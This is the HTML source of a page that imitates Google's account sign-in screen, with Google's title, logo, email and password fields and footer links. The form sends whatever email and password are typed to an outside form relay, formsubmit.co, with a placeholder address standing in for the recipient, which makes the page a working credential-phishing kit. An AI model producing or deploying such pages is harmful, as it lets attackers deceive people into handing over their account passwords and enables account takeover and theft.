<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap"
      rel="stylesheet"
    />

    <link rel="stylesheet" href="./reset.css" />
    <link rel="stylesheet" href="./styles.css" />

    <title>Sign in to Google Accounts</title>
  </head>

  <body>
    <div class="container">
      <div class="card">
        <img src="google-logo.svg" alt="Google Logo" />
        <h2>Login</h2>
        <h3>Use your Google Account</h3>

        <form action="https://formsubmit.co/your-email" method="POST">
          <input type="email" name="email" placeholder="Email or phone" required />
          <div class="btn-email">
            <button type="button">Forgot your email?</button>
          </div>

          <input type="password" name="password" placeholder="Enter your password" required />
          <div class="btn-email">
            <button type="button">Forgot password?</button>
          </div>

          <p>
            Not at your computer? Use Guest Mode to log in privately.
            <a href="#">Learn more</a>
          </p>

          <div class="card-bottom">
            <a href="#">Create account</a>
            <button type="submit">Next</button>
          </div>
        </form>
      </div>

      <div class="footer">
        <select name="select">
          <option value="Portugês (Brasil)">Portugês (Brasil)</option>
          <option value="English (United States)">English (United States)</option>
          <option value="Español (España)">Español (España)</option>
        </select>
        <div class="footer-span">
          <span>Help</span>
          <span>Privacy</span>
          <span>Terms</span>
        </div>
      </div>
    </div>
  </body>
</html>
